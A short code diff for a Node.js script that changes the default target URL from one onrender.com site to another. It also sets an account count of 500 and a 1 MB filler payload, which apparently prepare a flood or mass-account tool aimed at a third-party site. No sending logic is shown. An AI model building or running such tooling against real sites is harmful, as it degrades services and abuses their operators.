@@ -1,5 +1,5 @@
 const http = require('http');
-const target = process.env.TARGET_URL || 'https://app-getkey.onrender.com';
+const target = process.env.TARGET_URL || 'https://shopaccnqp.onrender.com';
 const port = process.env.PORT || 10000;
 const accCount = parseInt(process.env.ACC_COUNT || '500');
 const bigContent = 'A'.repeat(1048576);
